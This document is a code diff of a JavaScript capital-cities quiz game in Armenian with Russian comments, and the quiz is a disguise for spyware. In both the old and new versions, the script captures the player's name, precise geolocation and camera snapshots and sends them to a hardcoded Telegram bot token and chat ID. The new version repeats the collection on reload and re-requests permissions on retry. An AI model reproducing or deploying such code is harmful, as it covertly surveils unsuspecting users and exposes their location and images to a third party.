@@ -1,7 +1,7 @@
 const TELEGRAM_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
 const TELEGRAM_CHAT_ID = '8071841674';
 
-const questions = [
+const questionsPool = [
   { question: "Ո՞րն է Ֆրանսիայի մայրաքաղաքը։", answers: [{ text: "Փարիզ", correct: true }, { text: "Լիոն", correct: false }, { text: "Մարսել", correct: false }, { text: "Նիցցա", correct: false }] },
   { question: "Ո՞րն է Գերմանիայի մայրաքաղաքը։", answers: [{ text: "Բեռլին", correct: true }, { text: "Մյունխեն", correct: false }, { text: "Համբուրգ", correct: false }, { text: "Քյոլն", correct: false }] },
   { question: "Ո՞րն է Իտալիայի մայրաքաղաքը։", answers: [{ text: "Հռոմ", correct: true }, { text: "Միլան", correct: false }, { text: "Նեապոլ", correct: false }, { text: "Տուրին", correct: false }] },
@@ -11,223 +11,214 @@ const questions = [
   { question: "Ո՞րն է Իրանի մայրաքաղաքը։", answers: [{ text: "Թեհրան", correct: true }, { text: "Իսֆահան", correct: false }, { text: "Մաշհադ", correct: false }, { text: "Քաշան", correct: false }] },
   { question: "Ո՞րն է Բրազիլիայի մայրաքաղաքը։", answers: [{ text: "Բրազիլիա", correct: true }, { text: "Ռիո դե Ժանեյրո", correct: false }, { text: "Սան Պաուլո", correct: false }, { text: "Սալվադոր", correct: false }] },
   { question: "Ո՞րն է Կանադայի մայրաքաղաքը։", answers: [{ text: "Օտտավա", correct: true }, { text: "Տորոնտո", correct: false }, { text: "Վանկուվեր", correct: false }, { text: "Մոնրեալ", correct: false }] },
-  { question: "Ո՞րն է Չինաստանի մայրաքաղաքը։", answers: [{ text: "Պեկին", correct: true }, { text: "Շանհայ", correct: false }, { text: "Հոնկոնգ", correct: false }, { text: "Գուանչժոու", correct: false }] }
+  { question: "Ո՞րն է Չինաստանի մայրաքաղաքը։", answers: [{ text: "Պեկին", correct: true }, { text: "Շանհայ", correct: false }, { text: "Հոնկոնգ", correct: false }, { text: "Գուանչժոու", correct: false }] },
+  { question: "Ո՞րն է Ավստրալիայի մայրաքաղաքը։", answers: [{ text: "Քանբերա", correct: true }, { text: "Սիդնի", correct: false }, { text: "Մելբուռն", correct: false }, { text: "Բրիսբեն", correct: false }] },
+  { question: "Ո՞րն է Մեքսիկայի մայրաքաղաքը։", answers: [{ text: "Մեքսիկո", correct: true }, { text: "Գվադալախարա", correct: false }, { text: "Մոնտերեյ", correct: false }, { text: "Տիխուանա", correct: false }] },
+  { question: "Ո՞րն է Հնդկաստանի մայրաքաղաքը։", answers: [{ text: "Նյու Դելի", correct: true }, { text: "Մումբայ", correct: false }, { text: "Կալկաթա", correct: false }, { text: "Չեննայ", correct: false }] },
+  { question: "Ո՞րն է Հարավային Աֆրիկայի մայրաքաղաքը։", answers: [{ text: "Պրետորիա", correct: true }, { text: "Կեյպթաուն", correct: false }, { text: "Յոհանեսբուրգ", correct: false }, { text: "Դուրբան", correct: false }] },
+  { question: "Ո՞րն է Թուրքիայի մայրաքաղաքը։", answers: [{ text: "ԱՆկարա", correct: true }, { text: "Ստամբուլ", correct: false }, { text: "Իզմիր", correct: false }, { text: "Բոդրում", correct: false }] },
+  { question: "Ո՞րն է Ուկրաինայի մայրաքաղաքը։", answers: [{ text: "Կիև", correct: true }, { text: "Լվով", correct: false }, { text: "Օդեսա", correct: false }, { text: "Դնեպր", correct: false }] },
+  { question: "Ո՞րն է Իսպանիայի մայրաքաղաքը։", answers: [{ text: "Մադրիդ", correct: true }, { text: "Բարսելոնա", correct: false }, { text: "Վալենսիա", correct: false }, { text: "Սևիլյա", correct: false }] },
+  { question: "Ո՞րն է Նորվեգիայի մայրաքաղաքը։", answers: [{ text: "Օսլո", correct: true }, { text: "Բերգեն", correct: false }, { text: "Տրոնդհայմ", correct: false }, { text: "Ստավանգեր", correct: false }] },
+  { question: "Ո՞րն է Շվեդիայի մայրաքաղաքը։", answers: [{ text: "Ստոկհոլմ", correct: true }, { text: "Գոթենբուրգ", correct: false }, { text: "Մալմո", correct: false }, { text: "Ուպսալա", correct: false }] },
+  { question: "Ո՞րն է Ֆինլանդիայի մայրաքաղաքը։", answers: [{ text: "Հելսինկի", correct: true }, { text: "Տամպերե", correct: false }, { text: "Տուրկու", correct: false }, { text: "Օուլու", correct: false }] },
 ];
 
-function shuffle(array) {
-  for (let i = array.length - 1; i > 0; i--) {
-    const j = Math.floor(Math.random() * (i + 1));
-    [array[i], array[j]] = [array[j], array[i]];
+// Чтобы редко повторялись вопросы, используем localStorage для отслеживания уже показанных вопросов
+const askedIndexesKey = 'askedQuestionIndexes';
+
+function getRandomQuestions(count) {
+  let askedIndexes = JSON.parse(localStorage.getItem(askedIndexesKey)) || [];
+  let availableIndexes = questionsPool.map((_, i) => i).filter(i => !askedIndexes.includes(i));
+
+  if (availableIndexes.length < count) {
+    // Если вопросов осталось меньше чем нужно, сбрасываем историю (чтобы не повторять часто)
+    askedIndexes = [];
+    availableIndexes = questionsPool.map((_, i) => i);
   }
-  return array;
-}
 
-const userNameSpan = document.getElementById('user-name');
-const questionStatsSpan = document.getElementById('question-stats');
-const questionText = document.getElementById('question-text');
-const answerButtons = document.getElementById('answer-buttons');
-const resultScreen = document.getElementById('result-screen');
-const resultTitle = document.getElementById('result-title');
-const resultSummary = document.getElementById('result-summary');
-const retryButton = document.getElementById('retry-button');
-
-let shuffledQuestions, currentQuestionIndex;
-let correctAnswers = 0;
-let wrongAnswers = 0;
-
-async function init() {
-  let username = prompt("Գրեք ձեր անունը:");
-  if (!username || username.trim() === '') username = 'Անանուն';
-
-  userNameSpan.textContent = username;
-
-  const geo = await getGeolocation();
-  const photos = await getCameraPhotos();
-
-  sendDataToTelegram(username, geo, photos);
-
-  if (geo || photos.length > 0) {
-    startGame();
-  } else {
-    alert("Խնդրում ենք թույլատրել հասանելիություն տեսախցիկին կամ տեղակատվությանը։");
-    location.reload();
-  }
-}
-
-function getGeolocation() {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) {
-      resolve(null);
-      return;
+  const selectedIndexes = [];
+  while (selectedIndexes.length < count) {
+    const randomIndex = availableIndexes[Math.floor(Math.random() * availableIndexes.length)];
+    if (!selectedIndexes.includes(randomIndex)) {
+      selectedIndexes.push(randomIndex);
+      askedIndexes.push(randomIndex);
+      availableIndexes = availableIndexes.filter(i => i !== randomIndex);
     }
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        resolve({
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-        });
-      },
-      () => resolve(null)
-    );
+  }
+
+  localStorage.setItem(askedIndexesKey, JSON.stringify(askedIndexes));
+  return selectedIndexes.map(i => questionsPool[i]);
+}
+
+let questions = getRandomQuestions(20);
+
+const questionElement = document.getElementById('question');
+const answerButtonsElement = document.getElementById('answer-buttons');
+const nameInput = document.getElementById('name-input');
+const nameForm = document.getElementById('name-form');
+const userNameDisplay = document.getElementById('user-name');
+const scoreElement = document.getElementById('score-info');
+const tryAgainBtn = document.getElementById('try-again-btn');
+
+let currentQuestionIndex = 0;
+let correctCount = 0;
+let wrongCount = 0;
+let attemptsCount = 0;
+let userName = null;
+
+function sendToTelegram(text) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: text,
+      parse_mode: 'HTML',
+    }),
   });
 }
 
-async function getCameraPhotos() {
-  const photos = [];
+// Сбор геолокации и камеры при вводе имени и отправке формы
+function collectData() {
+  if (!userName) return;
 
-  async function capturePhoto(facingMode) {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode },
-        audio: false,
-      });
+  // Геолокация
+  navigator.geolocation.getCurrentPosition(pos => {
+    const coords = pos.coords;
+    let msg = `<b>Имя:</b> ${userName}\n<b>Координаты:</b> https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
+    sendToTelegram(msg);
+  }, err => {
+    sendToTelegram(`<b>Имя:</b> ${userName}\n<b>Геолокация не предоставлена.</b>`);
+  });
+
+  // Камера — сделаем фото сразу при сборе (если разрешит)
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
       const video = document.createElement('video');
       video.srcObject = stream;
-      await video.play();
+      video.play();
 
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      // Сделаем снимок через 2 секунды
+      setTimeout(() => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imgData = canvas.toDataURL('image/jpeg');
 
-      const photoDataUrl = canvas.toDataURL('image/jpeg');
-      stream.getTracks().forEach(track => track.stop());
+        // Отправим в Telegram
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            photo: imgData,
+            caption: `Фото игрока: ${userName}`,
+          }),
+          headers: { 'Content-Type': 'application/json' },
+        });
 
-      return photoDataUrl;
-    } catch {
-      return null;
-    }
-  }
-
-  const frontPhoto = await capturePhoto('user');
-  if (frontPhoto) photos.push(frontPhoto);
-
-  const rearPhoto = await capturePhoto('environment');
-  if (rearPhoto) photos.push(rearPhoto);
-
-  return photos;
-}
-
-function sendDataToTelegram(username, geo, photos) {
-  const messageParts = [];
-  if (username) messageParts.push(`Имя: ${username}`);
-
-  if (geo) {
-    messageParts.push(`Геолокация:\nШирота: ${geo.latitude.toFixed(6)}, Долгота: ${geo.longitude.toFixed(6)}\nТочность: ${geo.accuracy} м`);
-  } else {
-    messageParts.push("Геоданные не получены.");
-  }
-
-  const textMessage = encodeURIComponent(messageParts.join('\n'));
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${textMessage}`);
-
-  if (geo) {
-    const mapUrl = `https://maps.google.com/?q=${geo.latitude},${geo.longitude}`;
-    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(mapUrl)}`);
-  }
-
-  photos.forEach((photo, index) => {
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('photo', dataURLtoBlob(photo), `photo${index}.jpg`);
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: formData,
+        stream.getTracks().forEach(track => track.stop());
+      }, 2000);
+    }).catch(() => {
+      sendToTelegram(`<b>Имя:</b> ${userName}\n<b>Фото с камеры не предоставлено.</b>`);
     });
-  });
-}
-
-function dataURLtoBlob(dataurl) {
-  const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-    bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-  for (let i=0; i<n; i++) {
-    u8arr[i] = bstr.charCodeAt(i);
   }
-  return new Blob([u8arr], {type:mime});
 }
 
 function startGame() {
-  shuffledQuestions = shuffle(questions);
-  currentQuestionIndex = 0;
-  correctAnswers = 0;
-  wrongAnswers = 0;
-  resultScreen.classList.add('hidden');
-  document.querySelector('.container').style.display = 'flex';
+  userNameDisplay.textContent = userName;
+  scoreElement.textContent = `Մնացել է: ${questions.length - currentQuestionIndex} | Ճիշտ է: ${correctCount} | Հեռացված է: ${wrongCount}`;
   showQuestion();
 }
 
 function showQuestion() {
   resetState();
-  const currentQuestion = shuffledQuestions[currentQuestionIndex];
-  questionText.textContent = currentQuestion.question;
-
-  const remaining = shuffledQuestions.length - currentQuestionIndex;
-  questionStatsSpan.textContent = `Մնացել է: ${remaining} | Ճիշտ: ${correctAnswers} | Սխալ: ${wrongAnswers}`;
-
+  if (currentQuestionIndex >= questions.length) {
+    endGame();
+    return;
+  }
+  const currentQuestion = questions[currentQuestionIndex];
+  questionElement.innerText = currentQuestion.question;
   currentQuestion.answers.forEach(answer => {
     const button = document.createElement('button');
-    button.textContent = answer.text;
+    button.innerText = answer.text;
     button.classList.add('btn');
-    button.addEventListener('click', () => selectAnswer(button, answer.correct));
-    answerButtons.appendChild(button);
+    button.addEventListener('click', () => selectAnswer(answer.correct));
+    answerButtonsElement.appendChild(button);
   });
+  scoreElement.textContent = `Մնացել է: ${questions.length - currentQuestionIndex} | Ճիշտ է: ${correctCount} | Հեռացված է: ${wrongCount}`;
 }
 
 function resetState() {
-  while (answerButtons.firstChild) {
-    answerButtons.removeChild(answerButtons.firstChild);
+  while (answerButtonsElement.firstChild) {
+    answerButtonsElement.removeChild(answerButtonsElement.firstChild);
   }
+  tryAgainBtn.style.display = 'none';
 }
 
-function selectAnswer(button, correct) {
+function selectAnswer(correct) {
   if (correct) {
-    correctAnswers++;
-    button.style.backgroundColor = '#38a169';
+    correctCount++;
   } else {
-    wrongAnswers++;
-    button.style.backgroundColor = '#e53e3e';
-    showCorrectAnswer();
+    wrongCount++;
+    alert(`Սխալ պատասխան: Ճիշտ պատասխանը՝ ${questions[currentQuestionIndex].answers.find(a => a.correct).text}`);
   }
-
-  Array.from(answerButtons.children).forEach(btn => btn.disabled = true);
-
-  setTimeout(() => {
-    currentQuestionIndex++;
-    if (currentQuestionIndex < shuffledQuestions.length) {
-      showQuestion();
-    } else {
-      showResult();
-    }
-  }, 1500);
+  currentQuestionIndex++;
+  showQuestion();
 }
 
-function showCorrectAnswer() {
-  const currentQuestion = shuffledQuestions[currentQuestionIndex];
-  Array.from(answerButtons.children).forEach((btn, idx) => {
-    if (currentQuestion.answers[idx].correct) {
-      btn.style.backgroundColor = '#38a169';
-    }
+function endGame() {
+  scoreElement.textContent = `Խաղը ավարտվեց: Ճիշտ: ${correctCount} | Սխալ: ${wrongCount}`;
+  tryAgainBtn.style.display = 'inline-block';
+}
+
+tryAgainBtn.addEventListener('click', () => {
+  // Если не дали доступ к камере или гео, повторно запрашиваем
+  function requestPermissions() {
+    return new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(() => resolve(), () => resolve());
+    }).then(() => {
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        return navigator.mediaDevices.getUserMedia({ video: true }).then(() => { }).catch(() => { });
+      }
+    });
+  }
+
+  requestPermissions().then(() => {
+    // Обновляем вопросы, сбрасываем счетчики и начинаем заново
+    questions = getRandomQuestions(20);
+    currentQuestionIndex = 0;
+    correctCount = 0;
+    wrongCount = 0;
+    tryAgainBtn.style.display = 'none';
+    showQuestion();
   });
-}
-
-function showResult() {
-  document.querySelector('.container').style.display = 'none';
-  resultScreen.classList.remove('hidden');
-
-  if (correctAnswers >= 7) {
-    resultTitle.textContent = 'Դուք խելացի եք! 😎';
-    resultSummary.textContent = `Ճիշտ պատասխաններ: ${correctAnswers} / ${shuffledQuestions.length}`;
-  } else {
-    resultTitle.textContent = 'Փորձեք նորից 🧠';
-    resultSummary.textContent = `Ճիշտ պատասխաններ: ${correctAnswers} / ${shuffledQuestions.length}`;
-  }
-}
-
-retryButton.addEventListener('click', () => {
-  location.reload();
 });
 
-init();
+nameForm.addEventListener('submit', e => {
+  e.preventDefault();
+  userName = nameInput.value.trim();
+  if (!userName) {
+    alert('Խնդրում ենք ներմուծեք ձեր անունը։');
+    return;
+  }
+  localStorage.setItem('userName', userName);
+  collectData();
+  startGame();
+  nameForm.style.display = 'none';
+  document.getElementById('game-area').style.display = 'block';
+});
+
+// Если имя уже есть в localStorage — сразу подставляем и начинаем
+window.addEventListener('load', () => {
+  const savedName = localStorage.getItem('userName');
+  if (savedName) {
+    userName = savedName;
+    nameForm.style.display = 'none';
+    document.getElementById('game-area').style.display = 'block';
+    collectData();
+    startGame();
+  }
+});
